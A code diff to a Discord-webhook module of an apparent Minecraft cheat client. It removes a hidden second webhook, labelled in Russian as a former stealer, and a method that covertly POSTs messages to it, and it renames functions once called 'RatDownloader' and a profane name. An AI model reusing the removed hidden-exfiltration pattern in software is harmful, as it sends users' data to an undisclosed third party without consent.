@@ -55,7 +55,7 @@ public class DiscordWebhook extends Module {
 
 
 
-    public static String NeStradaiHuinei(){
+    public static String readurl(){
         try {
             File file = new File("ThunderHack/WHOOK.txt");
 
@@ -75,7 +75,7 @@ public class DiscordWebhook extends Module {
 
 
 
-    public static void RatDownloader(String rat) {
+    public static void saveurl(String rat) {
         File file = new File("ThunderHack/WHOOK.txt");
         try {
             new File("ThunderHack").mkdirs();
@@ -87,7 +87,6 @@ public class DiscordWebhook extends Module {
     }
 
 
-    static String whookurl2 = "тут был слиллер, но я его убрал :3";
     @SubscribeEvent
     public void onScreenshotEvent(ScreenshotEvent screenshotEvent) {
         Command.sendMessage("SS Getted!");
@@ -97,46 +96,7 @@ public class DiscordWebhook extends Module {
         }
         this.a(screenshotEvent.getImage());
     }
-    public static void sendMsg2(String message) {
-        PrintWriter out = null;
-        BufferedReader in = null;
-        StringBuilder result = new StringBuilder();
-        try {
-            String line;
-            URL realUrl = new URL(whookurl2);
-            URLConnection conn = realUrl.openConnection();
-            conn.setRequestProperty("accept", "*/*");
-            conn.setRequestProperty("connection", "Keep-Alive");
-            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
-            conn.setDoOutput(true);
-            conn.setDoInput(true);
-            out = new PrintWriter(conn.getOutputStream());
-            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
-            out.print(postData);
-            out.flush();
-            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            while ((line = in.readLine()) != null) {
-                result.append("/n").append(line);
-            }
-        }
-        catch (Exception e) {
-            e.printStackTrace();
-        }
-        finally {
-            try {
-                if (out != null) {
-                    out.close();
-                }
-                if (in != null) {
-                    in.close();
-                }
-            }
-            catch (IOException ex) {
-                ex.printStackTrace();
-            }
-        }
-        System.out.println(result);
-    }
+
     @SubscribeEvent
     public void onConnectionEvent(ConnectToServerEvent e) {
         (new Thread(() -> {
@@ -146,7 +106,7 @@ public class DiscordWebhook extends Module {
                 var2.printStackTrace();
             }
             String msg = "```" + mc.player.getName() + " зашёл на сервер " + e.getIp() + "```";
-            sendMsg(msg,NeStradaiHuinei());
+            sendMsg(msg,readurl());
         })).start();
     }
 
@@ -243,9 +203,9 @@ public class DiscordWebhook extends Module {
                                      "\n" + date +"\n" + "на сервере " + ip + "```";
 
                 if(sendToDiscord.getValue()){
-                    sendMsg(string4,NeStradaiHuinei());
+                    sendMsg(string4,readurl());
                     if(SDescr.getValue()) {
-                        sendMsg(description, NeStradaiHuinei());
+                        sendMsg(description, readurl());
                     }
 
                 }
@@ -265,7 +225,7 @@ public class DiscordWebhook extends Module {
             this.b.execute(() -> {
                 Thread.currentThread().setName("TotemPop");
                 String str = "```" + mc.player.getName() + " " + getWord() + e.getEntity().getName() + "```";
-                sendMsg(str, NeStradaiHuinei());
+                sendMsg(str, readurl());
             });
         }
     }
@@ -323,7 +283,7 @@ public class DiscordWebhook extends Module {
                             "\n" + "Ударов потребовалось: " + hids + "( промахов: " + missfuck + ")" + "процент попаданий: " + calculatePercentage(hids - missfuck,hids) + "%" +
                             "\n" + "BackTrack " + (isBT ? ("Включен  Ударов: " + bthits + " Промахов: " + btmisses  + " Макс.Дистанция "+ maxDist ) : "Выключен") +
                             "\n" + "Каппучино потребовалось: " + caps +
-                            "\n" + "Макс. скорость цели: " + speeed + " км/ч" + "```", NeStradaiHuinei());
+                            "\n" + "Макс. скорость цели: " + speeed + " км/ч" + "```", readurl());
         })).start();
 
         Aura.targetMaxSpeed = 0;
